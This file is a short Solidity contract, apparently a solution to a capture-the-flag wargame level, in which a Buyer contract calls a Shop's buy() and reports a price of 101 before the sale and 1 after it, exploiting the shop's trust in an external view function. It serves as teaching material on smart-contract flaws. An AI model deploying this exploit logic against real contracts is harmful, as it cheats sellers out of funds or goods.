// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
  function buy() external;
  function isSold() external view returns(bool);
}

contract Buyer {
  address shop_address;
  int counter;

  constructor(address _addr) public {
      shop_address = _addr;
      counter = -1;
  }

  function call() public {
      Shop(shop_address).buy();
  }


  function price() public view returns(uint) {
      bool sold = Shop(shop_address).isSold();
      if (sold == false) {
          return 101;
      } else {
          return 1;
      }
  }

}